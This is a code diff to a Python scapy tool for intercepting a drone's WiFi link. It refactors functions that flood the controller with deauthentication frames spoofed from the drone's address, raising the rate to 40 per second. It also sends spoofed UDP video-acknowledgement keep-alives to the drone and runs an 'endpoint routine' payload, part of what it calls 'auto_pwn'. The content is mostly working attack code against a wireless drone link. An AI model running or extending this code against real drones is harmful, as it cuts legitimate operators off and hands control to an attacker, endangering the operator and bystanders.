@@ -36,6 +36,9 @@ COMPLEX_SCANNER_BPF_FILTER = "udp"
 
 SSID_ELEMENT_ID = 0
 
+DEAUTHS_PER_SECOND = 40
+KEEP_ALIVES_PER_SECOND = 40
+
 # TODO: Have the user choose either connected or connectionless mode.
 #  If connectionless, start a scan, then do the unconnected_routine
 #  If connected, initiate connection (have user do that?), then do connected routine.
@@ -51,7 +54,7 @@ def _udp_layer_3_4(drone_ip: str, controller_ip: str) -> UDP:
            UDP(sport=UDP_SRC_PORT, dport=UDP_DST_PORT)
 
 
-def _dot11_data_layer(drone_mac: str, controller_mac: str) -> SNAP():
+def _dot11_layer_2(drone_mac: str, controller_mac: str) -> SNAP():
     return RadioTap(present="Rate+TXFlags") / \
            Dot11FCS(addr1=drone_mac, addr2=controller_mac, addr3=drone_mac, type=2, subtype=8) / \
            Dot11QoS() / \
@@ -71,21 +74,28 @@ def new_deauth(dst_mac: str, src_mac: str, ap_mac: str, seq_num: int, reason: in
            DOT11_DISCONNECT_TYPE(reason=reason)
 
 
-def _start_deauther(interface_name: str, is_terminating: Event, deauth: Packet) -> None:
+def _start_deauther(interface_name: str, deauth: Packet) -> Event:
+    is_terminating = Event()
+
     def deauth_loop():
         seq = 0
         while not is_terminating.set():
             sendp(deauth, iface=interface_name, verbose=False)
             deauth[Dot11].SC = _new_sequence_control(0, seq)
             seq += 1
-            sleep(0.5)
+            sleep(1 / DEAUTHS_PER_SECOND)
+
     thread = Thread(target=deauth_loop)
     thread.start()
+
+    return is_terminating
 
 
 # FIXME: Will need to sniff for the current ack number using _scan_for_current_video_ack in auto_pwn
 #  Combine autopwn and this file since it's not clear what should go where. They're very similar.
-def _start_udp_keep_alive(interface_name: str, is_terminating: Event, l4_base: Packet, sender_func: Callable) -> None:
+def _start_udp_keep_alive(interface_name: str, l4_base: Packet, sender_func: Callable) -> Event:
+    is_terminating = Event()
+
     def keep_alive_loop():
         # comm_keep_alive = l4_base / new_default_command_payload()
         video_keep_alive = l4_base / new_video_ack(0)
@@ -96,40 +106,39 @@ def _start_udp_keep_alive(interface_name: str, is_terminating: Event, l4_base: P
             # sender_func(comm_keep_alive, iface=interface_name, verbose=False)
             sender_func(video_keep_alive, iface=interface_name, verbose=False)
             seq_n += 1
-            sleep(0.05)
+            sleep(1 / KEEP_ALIVES_PER_SECOND)
 
     thread = Thread(target=keep_alive_loop)
     thread.start()
 
-
-def keep_alive_initialization(interface_name: str, l4_base: Packet, sender_func: Callable) -> Event:
-    terminating_event = Event()
-    _start_udp_keep_alive(interface_name, terminating_event, l4_base, sender_func)
-
-    return terminating_event
+    return is_terminating
 
 
 # TODO: Also start thread that watches for video ACK numbers and responds to keep the video feed flowing.
+# TODO: Use a separate process instead so the main process doesn't get bogged down with sends?
 
 
 def connectionless_interception_routine(interface_name: str,
                                         addrs: AddressResults,
                                         endpoint_routine: EndpointRoutine):
-    """Intercepts an existing connection with a drone, then runs the endpoint routine 'payload' once complete.
+    """Intercepts an existing connection with a drone, then runs the endpoint routine 'payload' once interception is complete.
     endpoint_routine accepts the name of the interface to use, a UDP packet to build packets with, and
     a function (either of scapy's send or sendp) to use to send."""
-    layer_2 = _dot11_data_layer(addrs.drone_mac, addrs.controller_mac)
-    layers_3_4 = _udp_layer_3_4(addrs.drone_ip, addrs.controller_ip)
+    sender_func = sendp
+
+    l4_base = _dot11_layer_2(addrs.drone_mac, addrs.controller_mac) / \
+              _udp_layer_3_4(addrs.drone_ip, addrs.controller_ip)
 
     deauth = new_deauth(addrs.controller_mac, addrs.drone_mac, addrs.drone_mac, 1, DEAUTH_REASON)
-    deauth_terminating = Event()
+    keep_alive_terminating = _start_udp_keep_alive(interface_name, l4_base, sender_func)
+    deauth_terminating = _start_deauther(interface_name, deauth)
     try:
-        _start_deauther(interface_name, deauth_terminating, deauth)
-        endpoint_routine(interface_name, layer_2 / layers_3_4, sendp)
+        endpoint_routine(interface_name, l4_base, sender_func)
     except KeyboardInterrupt:
         pass
     finally:
         deauth_terminating.set()
+        keep_alive_terminating.set()
 
 
 def connected_interception_routine(interface_name: str,
@@ -172,7 +181,7 @@ def _find_info_val_for(element_id: int, beacon: Dot11Beacon) -> Optional[bytes]:
         layer = layer.payload
     return None
 
-
+# TODO: INTEGRATE!
 def scan_for_drone_traffic(interface_name: str,
                            secs_per_channel: float,
                            ssid_prefix: bytes,
